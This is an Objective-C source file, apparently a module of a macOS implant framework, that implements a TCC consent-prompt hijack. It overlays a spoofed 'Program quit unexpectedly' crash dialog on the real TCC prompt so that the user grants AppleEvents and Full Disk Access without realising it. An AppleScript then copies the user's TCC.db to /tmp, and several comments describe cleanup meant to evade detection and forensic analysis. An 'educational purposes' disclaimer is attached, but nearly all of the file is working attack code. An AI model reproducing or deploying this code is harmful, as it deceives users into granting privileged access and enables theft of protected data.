/**
 * ZTCCJackCommandHandler.m
 * 
 * A sophisticated handler for bypassing macOS TCC (Transparency, Consent, and Control) protections
 * by exploiting user interface trust and system dialog patterns. This implementation leverages
 * several macOS security model characteristics:
 * 
 * 1. Users are conditioned to trust system-level dialogs
 * 2. TCC's permission model relies on user interaction
 * 3. AppleEvents can be used to trigger privileged operations
 * 
 * Component Architecture:
 * ```
 *                      ZTCCJackCommandHandler
 *                              |
 *                 +------------------------+
 *                 |           |            |
 *         WindowController ScriptManager PermissionManager
 *                 |           |            |
 *            Spoofed UI   AppleScript   TCC State
 * ```
 * 
 * Privilege Escalation Flow:
 * ```
 *    User Space                    TCC Layer                  Protected Resource
 *    +------------+               +-----------+              +----------------+
 *    |            |   Present    |           |   Approve    |                |
 *    |  Spoofed   |------------>|    TCC    |------------->|  System Files  |
 *    |  Dialog    |   Dialog    |  Prompt   |   Access     |    & Data     |
 *    |            |             |           |              |                |
 *    +------------+             +-----------+              +----------------+
 *          |                         |                            |
 *          |                         |                            |
 *    Execute Script              Check State                 Write Marker
 *          |                         |                            |
 *          v                         v                            v
 *    +------------+             +-----------+              +----------------+
 *    |            |   Monitor   |           |   Verify    |                |
 *    |  Script    |------------>|  Marker   |<------------|    Success/    |
 *    | Manager    |   Files     |  Files    |   Result    |    Failure    |
 *    |            |             |           |              |                |
 *    +------------+             +-----------+              +----------------+
 * ```
 * 
 * Window Management:
 * ```
 *    Screen Layout                    Window Stack
 *    +------------------+            +---------------+
 *    |                  |            | System Dialog |
 *    |  +------------+ |            +---------------+
 *    |  |  Spoofed   | |            | Spoofed UI    |
 *    |  |  Dialog    | |            +---------------+
 *    |  +------------+ |            | User Windows  |
 *    |                  |            +---------------+
 *    +------------------+
 *    
 *    Coordinates: (x,y) = (screen.width/2 - 150, screen.height - 530)
 * ```
 * 
 * IPC Mechanism:
 * ```
 *    Temporary Directory                    Marker Files
 *    +----------------------+              +------------------+
 *    | /tmp/               |              | /tmp/            |
 *    |   └── scripts/     |              |   ├── success   |
 *    |       └── *.scpt   |              |   └── failure   |
 *    +----------------------+              +------------------+
 *           |                                     ^
 *           |              Write                  |
 *           +------------------------------------>|
 *                                                |
 *                          Monitor               |
 *           <------------------------------------+
 * ```
 * 
 * Security Considerations:
 * - This code demonstrates how UI spoofing can be used to obtain elevated privileges
 * - The technique exploits user trust in system dialogs
 * - Uses temporary files for IPC, which could be race-conditioned (though mitigated)
 * - Requires careful timing between UI presentation and AppleScript execution
 * 
 * Usage:
 * ```objc
 * ZTCCJackCommandHandler *handler = [[ZTCCJackCommandHandler alloc] init];
 * [handler executeCommand:command completion:^(BOOL success, NSDictionary *result, NSError *error) {
 *     if (success) {
 *         // TCC bypass successful, Full Disk Access obtained
 *     }
 * }];
 * ```
 * 
 * @warning This code is for educational purposes. In production, ensure proper security review
 *          and compliance with Apple's security guidelines.
 */

#import "ZTCCJackCommandHandler.h"
#import "ZDialogCommandHandler.h"
#import <AppKit/AppKit.h>
#import <Security/Security.h>
#import <objc/runtime.h>
#import <dlfcn.h>

// For macOS version checking
#include <AvailabilityMacros.h>

// Error domain and codes with security implications
static NSString * const ZTCCJackErrorDomain = @"com.ztccjack.error";
typedef NS_ENUM(NSInteger, ZTCCJackErrorCode) {
    ZTCCJackErrorCodeScriptCreationFailed = 1000,  // Failed to create AppleScript (potential sandbox/permission issues)
    ZTCCJackErrorCodeScriptExecutionFailed = 1001, // Failed to execute AppleScript (potential system hardening)
    ZTCCJackErrorCodeWindowCreationFailed = 1002,  // Failed to create spoofed window (window server issues)
    ZTCCJackErrorCodePermissionResetFailed = 1003, // Failed to reset TCC DB (SIP/system hardening)
    ZTCCJackErrorCodeTimeout = 1004                // Operation timed out (user detection/prevention)
};

// Notification names for monitoring operation progress
static NSString * const ZTCCJackResponseReceivedNotification = @"ZTCCJackResponseReceivedNotification";
static NSString * const ZTCCJackTimeoutNotification = @"ZTCCJackTimeoutNotification";

// Timing and geometry constants (carefully tuned for system dialog mimicry)
static const NSTimeInterval kTCCJackTimeout = 30.0;           // Maximum wait time for user interaction
static const NSTimeInterval kTCCJackCheckInterval = 0.1;      // Polling interval (balanced for responsiveness)
static const CGFloat kTCCJackWindowWidth = 300.0;            // Matches system dialog width
static const CGFloat kTCCJackWindowHeight = 300.0;           // Matches system dialog height
static const CGFloat kTCCJackWindowTopOffset = 230.0;        // Positioned to overlay TCC prompt

/**
 * Window controller responsible for creating and managing the spoofed system dialog.
 * This class carefully mimics the appearance and behavior of genuine macOS system dialogs
 * to maintain user trust and expectation patterns.
 *
 * Security Notes:
 * - Window level set to NSScreenSaverWindowLevel to appear authoritative
 * - Click-through enabled to prevent user detection of overlay
 * - Careful timing of window presentation to coincide with TCC prompt
 */
@interface ZTCCJackWindowController : NSObject {
    NSWindow *_window;              // Strong reference to prevent premature release
    NSTimer *_checkTimer;           // Timer for polling TCC response
}

/** Handler called when TCC prompt receives user response */
@property (nonatomic, copy) void (^responseHandler)(BOOL success, NSString *message);

/** Initialize with specific screen for multi-display support */
- (instancetype)initWithScreen:(NSScreen *)screen;

/** Show window with precise timing */
- (void)showWindow;

/** Safely tear down window and resources */
- (void)closeWindow;

/** Begin monitoring for TCC response */
- (void)startResponseChecking;

/** Safely stop monitoring and cleanup */
- (void)stopResponseChecking;

/**
 * Monitors system state for TCC prompt response through filesystem markers.
 * Implements a polling mechanism to detect user interaction results while
 * maintaining security and reliability.
 *
 * @param timer NSTimer instance triggering the check
 */
- (void)checkResponse:(NSTimer *)timer;

@end

/**
 * Manages creation and execution of the privileged AppleScript operation.
 * This class handles the core privilege escalation mechanics by leveraging
 * AppleScript's ability to interact with protected resources.
 *
 * Security Notes:
 * - Scripts are stored in temp directory with appropriate permissions
 * - Careful cleanup of script files to prevent forensic analysis
 * - Error handling designed to prevent information leakage
 */
@interface ZTCCJackScriptManager : NSObject {
    NSString *_scriptPath;          // Path to temp script file
    NSTask *_scriptTask;            // Reference to running script process
}

/** Completion handler for script execution */
@property (nonatomic, copy) void (^completionHandler)(BOOL success, NSError *error);

/** Create the TCC bypass script with proper error handling */
- (BOOL)createScriptWithError:(NSError **)error;

/** Execute the script with privilege elevation attempt */
- (void)executeScript;

/** Thorough cleanup of all script artifacts */
- (void)cleanup;

@end

/**
 * Static utility class for managing TCC permission states and markers.
 * Handles the intricate details of TCC permission management and IPC
 * through the filesystem.
 *
 * Security Notes:
 * - Uses atomic file operations for marker files
 * - Implements proper cleanup to prevent detection
 * - Handles permission reset for repeated attempts
 */
@interface ZTCCJackPermissionManager : NSObject

/** Reset TCC permissions to force new prompt */
+ (BOOL)resetTCCPermissionsWithError:(NSError **)error;

/** Check for successful elevation marker */
+ (BOOL)checkForSuccessMarker;

/** Check for failed elevation marker */
+ (BOOL)checkForFailureMarker;

/** Retrieve detailed failure message */
+ (NSString *)failureMessage;

/** Clean up all marker files */
+ (void)cleanupMarkerFiles;

@end

// Define debug macro for verbose logging
#define TCCJACK_LOG(fmt, ...) NSLog(@"[TCCJack Debug] %s:%d - " fmt, __FUNCTION__, __LINE__, ##__VA_ARGS__)

@interface ZTCCJackCommandHandler () {
    ZDialogCommandHandler *_dialogHandler;
    ZTCCJackWindowController *_windowController;
    ZTCCJackScriptManager *_scriptManager;
    BOOL _tccPromptTriggered;
    dispatch_queue_t _workQueue;
}

@property (nonatomic, copy) void (^commandCompletion)(BOOL success, NSDictionary *result, NSError *error);

// Memory-only TCC manipulation
- (BOOL)injectTCCPermissions;
- (void)hookTCCService;
- (void)interceptXPCConnection;
- (void)cleanupHooks;

// Process manipulation
- (pid_t)findTargetProcess;
- (BOOL)injectPayload:(pid_t)pid;
- (void)modifyTCCState:(pid_t)pid;

@end

@implementation ZTCCJackWindowController

/**
 * Initializes window controller with specific screen targeting.
 * Carefully positions and styles window to match system dialog appearance.
 *
 * Security Notes:
 * - Window positioning critical for believability
 * - Matches exact coordinates of system TCC prompts
 * - Implements proper memory management
 *
 * @param screen Target display for spoofed dialog
 * @return Initialized window controller
 */
- (instancetype)initWithScreen:(NSScreen *)screen {
    self = [super init];
    if (self) {
        NSRect screenRect = [screen frame];
        NSRect windowRect = NSMakeRect(0, 0, kTCCJackWindowWidth, kTCCJackWindowHeight);
        windowRect.origin.x = (screenRect.size.width - windowRect.size.width) / 2;
        windowRect.origin.y = screenRect.size.height - windowRect.size.height - kTCCJackWindowTopOffset;
        
        _window = [[NSWindow alloc] initWithContentRect:windowRect
                                            styleMask:NSWindowStyleMaskTitled
                                              backing:NSBackingStoreBuffered
                                                defer:NO];
        
        [self setupWindowAppearance];
        [self setupWindowContent];
    }
    return self;
}

- (void)dealloc {
    [self stopResponseChecking];
    [_window release];
    [_responseHandler release];
    [super dealloc];
}

/**
 * Configures window appearance to match system dialogs.
 * Critical for maintaining the illusion of system authenticity.
 *
 * Security Notes:
 * - Window level set high to appear authoritative
 * - Click-through enabled to prevent detection
 * - Careful styling to match system appearance
 */
- (void)setupWindowAppearance {
    [_window setOpaque:NO];
    [_window setMovable:NO];
    [_window setLevel:NSScreenSaverWindowLevel];
    [_window setIgnoresMouseEvents:YES];
}

/**
 * Sets up window content to mimic system crash reporter.
 * Carefully replicates the exact layout and styling of genuine system dialogs.
 *
 * Security Notes:
 * - Matches system font sizes and styles
 * - Uses genuine system warning icon
 * - Implements proper auto-layout
 */
- (void)setupWindowContent {
    NSView *contentView = [_window contentView];
    
    // Warning Icon - matches system icon
    NSImageView *imageView = [[[NSImageView alloc] initWithFrame:NSMakeRect(110, 200, 84, 84)] autorelease];
    [imageView setImage:[NSImage imageNamed:NSImageNameCaution]];
    [contentView addSubview:imageView];
    
    // Title
    NSTextField *titleLabel = [[[NSTextField alloc] init] autorelease];
    [titleLabel setBezeled:NO];
    [titleLabel setEditable:NO];
    [titleLabel setAlignment:NSTextAlignmentCenter];
    [titleLabel setFont:[NSFont boldSystemFontOfSize:16]];
    [titleLabel setStringValue:@"Program quit unexpectedly"];
    [titleLabel setBackgroundColor:[NSColor clearColor]];
    [titleLabel setFrame:NSMakeRect(0, 140, 300, 50)];
    [contentView addSubview:titleLabel];
    
    // Description
    NSTextField *descLabel = [[[NSTextField alloc] init] autorelease];
    [descLabel setAlignment:NSTextAlignmentLeft];
    [descLabel setBezeled:NO];
    [descLabel setEditable:NO];
    [descLabel setFont:[NSFont systemFontOfSize:15]];
    [descLabel setBackgroundColor:[NSColor clearColor]];
    [descLabel setFrame:NSMakeRect(42, -40, 220, 200)];
    [descLabel setStringValue:@"Click OK to see more detailed information and send a report to Apple."];
    [contentView addSubview:descLabel];
    
    // OK Button
    NSButton *okButton = [[[NSButton alloc] init] autorelease];
    [okButton setTitle:@"OK"];
    if ([okButton respondsToSelector:@selector(setWantsLayer:)]) {
        [okButton setWantsLayer:YES];
        if (okButton.layer) {
            [okButton.layer setBorderWidth:0];
            [okButton.layer setCornerRadius:10];
        }
    }
    [okButton setAlignment:NSTextAlignmentCenter];
    [okButton setFont:[NSFont systemFontOfSize:14]];
    [okButton setFrame:NSMakeRect(154, 36, 110, 30)];
    [contentView addSubview:okButton];
}

/** Show window with precise timing */
- (void)showWindow {
    [_window makeKeyAndOrderFront:nil];
}

/** Safely tear down window and resources */
- (void)closeWindow {
    [_window close];
}

/** Begin monitoring for TCC response */
- (void)startResponseChecking {
    [self stopResponseChecking];
    _checkTimer = [[NSTimer scheduledTimerWithTimeInterval:kTCCJackCheckInterval
                                                  target:self
                                                selector:@selector(checkResponse:)
                                                userInfo:nil
                                                 repeats:YES] retain];
}

/** Safely stop monitoring and cleanup */
- (void)stopResponseChecking {
    if (_checkTimer) {
        [_checkTimer invalidate];
        [_checkTimer release];
        _checkTimer = nil;
    }
}

- (void)checkResponse:(NSTimer *)timer {
    dispatch_async(dispatch_get_main_queue(), ^{
        BOOL success = [ZTCCJackPermissionManager checkForSuccessMarker];
        BOOL failure = [ZTCCJackPermissionManager checkForFailureMarker];
        
        if (success || failure) {
            [self stopResponseChecking];
            [ZTCCJackPermissionManager cleanupMarkerFiles];
            
            if (self.responseHandler) {
                NSString *message = success ? @"Full Disk Access was granted" :
                                  [ZTCCJackPermissionManager failureMessage];
                self.responseHandler(success, message);
            }
        }
    });
}

@end

@implementation ZTCCJackScriptManager

- (void)dealloc {
    [self cleanup];
    [_completionHandler release];
    [super dealloc];
}

/**
 * Creates privileged AppleScript in secure temporary location.
 * Implements careful file handling and permission management.
 *
 * Security Notes:
 * - Creates script in protected temp directory
 * - Uses atomic write operations
 * - Implements proper error handling
 * - Cleans up on failure
 *
 * @param error Pointer to NSError object for detailed error reporting
 * @return YES if script creation successful, NO otherwise
 */
- (BOOL)createScriptWithError:(NSError **)error {
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSString *tempDir = [NSTemporaryDirectory() stringByAppendingPathComponent:@"scripts"];
    
    // Create directory
    NSError *dirError = nil;
    if (![fileManager createDirectoryAtPath:tempDir 
                             withIntermediateDirectories:YES 
                                              attributes:nil 
                                    error:&dirError]) {
        if (error) {
            *error = [NSError errorWithDomain:ZTCCJackErrorDomain
                                       code:ZTCCJackErrorCodeScriptCreationFailed
                                   userInfo:@{NSUnderlyingErrorKey: dirError,
                                            NSLocalizedDescriptionKey: @"Failed to create script directory"}];
        }
        return NO;
    }
    
    // Create script path
    NSString *scriptPath = [tempDir stringByAppendingPathComponent:@"fulldisk_access.scpt"];
    
    // Script content
    NSString *scriptContent = @"tell application \"Finder\"\n"
                              @"    set applicationSupportDirectory to POSIX path of (path to application support from user domain)\n"
                              @"    set tccDirectory to applicationSupportDirectory & \"com.apple.TCC/TCC.db\"\n"
                              @"    try\n"
                              @"        duplicate file (POSIX file tccDirectory as alias) to folder (POSIX file \"/tmp/\" as alias) with replacing\n"
                              @"        do shell script \"touch /tmp/tccjack_success\"\n"
                              @"    on error errMsg\n"
                              @"        do shell script \"echo '\" & errMsg & \"' > /tmp/tccjack_failure\"\n"
                              @"    end try\n"
                              @"end tell";
    
    // Write script
    NSError *writeError = nil;
    if (![scriptContent writeToFile:scriptPath 
                                        atomically:YES 
                                          encoding:NSUTF8StringEncoding 
                             error:&writeError]) {
        if (error) {
            *error = [NSError errorWithDomain:ZTCCJackErrorDomain
                                       code:ZTCCJackErrorCodeScriptCreationFailed
                                   userInfo:@{NSUnderlyingErrorKey: writeError,
                                            NSLocalizedDescriptionKey: @"Failed to write script file"}];
        }
        return NO;
    }
    
    // Store path
    [_scriptPath release];
    _scriptPath = [scriptPath copy];
    
    return YES;
}

- (void)executeScript {
    if (!_scriptPath) {
        if (self.completionHandler) {
            NSError *error = [NSError errorWithDomain:ZTCCJackErrorDomain
                                               code:ZTCCJackErrorCodeScriptExecutionFailed
                                           userInfo:@{NSLocalizedDescriptionKey: @"No script path available"}];
            self.completionHandler(NO, error);
        }
        return;
    }
    
    @try {
        [_scriptTask release];
        _scriptTask = [[NSTask alloc] init];
        [_scriptTask setLaunchPath:@"/usr/bin/osascript"];
        [_scriptTask setArguments:@[_scriptPath]];
        [_scriptTask launch];
        
        if (self.completionHandler) {
            self.completionHandler(YES, nil);
        }
    } @catch (NSException *exception) {
        if (self.completionHandler) {
            NSError *error = [NSError errorWithDomain:ZTCCJackErrorDomain
                                               code:ZTCCJackErrorCodeScriptExecutionFailed
                                           userInfo:@{NSLocalizedDescriptionKey: [exception reason]}];
            self.completionHandler(NO, error);
        }
    }
}

- (void)cleanup {
    if (_scriptTask) {
        [_scriptTask terminate];
        [_scriptTask release];
        _scriptTask = nil;
    }
    
    if (_scriptPath) {
        [[NSFileManager defaultManager] removeItemAtPath:_scriptPath error:nil];
        [_scriptPath release];
        _scriptPath = nil;
    }
}

@end

@implementation ZTCCJackPermissionManager

/** Reset TCC permissions to force new prompt */
+ (BOOL)resetTCCPermissionsWithError:(NSError **)error {
    @try {
        NSTask *task = [[[NSTask alloc] init] autorelease];
        [task setLaunchPath:@"/usr/bin/tccutil"];
        [task setArguments:@[@"reset", @"AppleEvents"]];
        [task launch];
        [task waitUntilExit];
        
        if ([task terminationStatus] != 0) {
            if (error) {
                *error = [NSError errorWithDomain:ZTCCJackErrorDomain
                                           code:ZTCCJackErrorCodePermissionResetFailed
                                       userInfo:@{NSLocalizedDescriptionKey: @"Failed to reset TCC permissions"}];
            }
            return NO;
        }
        return YES;
    } @catch (NSException *exception) {
        if (error) {
            *error = [NSError errorWithDomain:ZTCCJackErrorDomain
                                       code:ZTCCJackErrorCodePermissionResetFailed
                                   userInfo:@{NSLocalizedDescriptionKey: [exception reason]}];
        }
        return NO;
    }
}

/** Check for successful elevation marker */
+ (BOOL)checkForSuccessMarker {
    return [[NSFileManager defaultManager] fileExistsAtPath:@"/tmp/tccjack_success"];
}

/** Check for failed elevation marker */
+ (BOOL)checkForFailureMarker {
    return [[NSFileManager defaultManager] fileExistsAtPath:@"/tmp/tccjack_failure"];
}

/** Retrieve detailed failure message */
+ (NSString *)failureMessage {
    NSError *error = nil;
    NSString *content = [NSString stringWithContentsOfFile:@"/tmp/tccjack_failure"
                                                encoding:NSUTF8StringEncoding
                                                   error:&error];
    return content ?: @"Full Disk Access was denied";
}

/** Clean up all marker files */
+ (void)cleanupMarkerFiles {
    NSFileManager *fileManager = [NSFileManager defaultManager];
    [fileManager removeItemAtPath:@"/tmp/tccjack_success" error:nil];
    [fileManager removeItemAtPath:@"/tmp/tccjack_failure" error:nil];
}

@end

@implementation ZTCCJackCommandHandler

/**
 * Initializes the TCC bypass command handler.
 * Sets up all necessary components for privilege escalation attempt.
 *
 * Security Notes:
 * - Creates isolated work queue
 * - Initializes components with proper memory management
 * - Maintains clean initial state
 *
 * @return Initialized command handler
 */
- (instancetype)init {
    self = [super initWithType:@"tccjack"];
    if (self) {
        _dialogHandler = [[ZDialogCommandHandler alloc] init];
        _tccPromptTriggered = NO;
        _workQueue = dispatch_queue_create("com.tccjack.workqueue", DISPATCH_QUEUE_SERIAL);
        _scriptManager = [[ZTCCJackScriptManager alloc] init];
        _windowController = nil;
    }
    return self;
}

/**
 * Performs thorough cleanup of all resources.
 * Critical for preventing memory leaks and maintaining security.
 */
- (void)dealloc {
    [_dialogHandler release];
    [_windowController release];
    [_scriptManager release];
    [_commandCompletion release];
    dispatch_release(_workQueue);
    [super dealloc];
}

/**
 * Primary entry point for TCC bypass operation.
 * Orchestrates the complete privilege escalation attempt:
 * 1. Sets up spoofed UI
 * 2. Resets TCC permissions
 * 3. Executes privileged operation
 * 4. Monitors results
 *
 * Security Notes:
 * - Implements proper thread safety
 * - Handles all error cases
 * - Cleans up resources in all paths
 * - Prevents memory leaks
 *
 * @param command Command model containing operation parameters
 * @param completion Block called with operation results
 */
- (void)executeCommand:(ZCommandModel *)command 
           completion:(void (^)(BOOL success, NSDictionary *result, NSError *error))completion {
    // Store completion handler
    self.commandCompletion = completion;
    
    dispatch_async(dispatch_get_main_queue(), ^{
        @try {
            // Setup application
            [self ensureApplicationSetup];
            
            // Create and show window
            _windowController = [[ZTCCJackWindowController alloc] initWithScreen:[NSScreen mainScreen]];
            __block typeof(self) weakSelf = self;
            _windowController.responseHandler = ^(BOOL success, NSString *message) {
                [weakSelf handleTCCResponse:success message:message];
            };
            [_windowController showWindow];
            
            // Reset permissions
            NSError *resetError = nil;
            if (![ZTCCJackPermissionManager resetTCCPermissionsWithError:&resetError]) {
                [self handleError:resetError];
                return;
            }
            
            // Create and execute script
            NSError *scriptError = nil;
            if (![_scriptManager createScriptWithError:&scriptError]) {
                [self handleError:scriptError];
                return;
            }
            
            _scriptManager.completionHandler = ^(BOOL success, NSError *error) {
                if (!success) {
                    [weakSelf handleError:error];
                    return;
                }
                
                // Start checking for response
                [weakSelf->_windowController startResponseChecking];
                
                // Set timeout
                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kTCCJackTimeout * NSEC_PER_SEC)),
                             dispatch_get_main_queue(), ^{
                    if (!weakSelf->_tccPromptTriggered) {
                        NSError *timeoutError = [NSError errorWithDomain:ZTCCJackErrorDomain
                                                                  code:ZTCCJackErrorCodeTimeout
                                                              userInfo:@{NSLocalizedDescriptionKey: @"TCC prompt did not appear"}];
                        [weakSelf handleError:timeoutError];
                    }
                });
            };
            
            [_scriptManager executeScript];
            
        } @catch (NSException *exception) {
            NSError *error = [NSError errorWithDomain:ZTCCJackErrorDomain
                                               code:ZTCCJackErrorCodeScriptExecutionFailed
                                           userInfo:@{NSLocalizedDescriptionKey: [exception reason]}];
            [self handleError:error];
        }
    });
}

/**
 * Handles TCC prompt response and cleanup.
 * Processes user interaction results and ensures proper resource cleanup.
 *
 * Security Notes:
 * - Sets operation state flags
 * - Creates sanitized result dictionary
 * - Implements proper cleanup sequence
 * - Maintains thread safety
 *
 * @param success Whether TCC access was granted
 * @param message Detailed result message
 */
- (void)handleTCCResponse:(BOOL)success message:(NSString *)message {
    _tccPromptTriggered = YES;
    
    NSMutableDictionary *result = [NSMutableDictionary dictionary];
    [result setObject:@"tccjack_response" forKey:@"type"];
    [result setObject:(success ? @"success" : @"failed") forKey:@"status"];
    [result setObject:message forKey:@"message"];
    
    // Cleanup
    [_windowController closeWindow];
    [_scriptManager cleanup];
    
    // Call completion
    if (self.commandCompletion) {
        self.commandCompletion(success, result, nil);
    }
}

/**
 * Handles errors during TCC bypass attempt.
 * Provides detailed error reporting while preventing information leakage.
 *
 * Security Notes:
 * - Creates sanitized error dictionary
 * - Implements proper cleanup sequence
 * - Maintains thread safety
 * - Prevents sensitive data exposure
 *
 * @param error The NSError object containing error details
 */
- (void)handleError:(NSError *)error {
    NSMutableDictionary *result = [NSMutableDictionary dictionary];
    [result setObject:@"tccjack_response" forKey:@"type"];
    [result setObject:@"failed" forKey:@"status"];
    [result setObject:[error localizedDescription] forKey:@"message"];
    
    // Cleanup
    [_windowController closeWindow];
    [_scriptManager cleanup];
    
    // Call completion
    if (self.commandCompletion) {
        self.commandCompletion(NO, result, error);
    }
}

/**
 * Ensures proper application setup for UI presentation.
 * Configures application for secure window management.
 *
 * Security Notes:
 * - Enforces main thread execution
 * - Configures minimal application presence
 * - Maintains UI security context
 *
 * @throws NSInternalInconsistencyException if not called from main thread
 */
- (void)ensureApplicationSetup {
    if (![NSThread isMainThread]) {
        [NSException raise:NSInternalInconsistencyException
                    format:@"ensureApplicationSetup must be called from main thread"];
    }
    
    NSApplication *app = [NSApplication sharedApplication];
    if (![NSApp isRunning]) {
        [NSApp setActivationPolicy:NSApplicationActivationPolicyAccessory];
        [NSApp finishLaunching];
    }
    [NSApp activateIgnoringOtherApps:YES];
}

@end 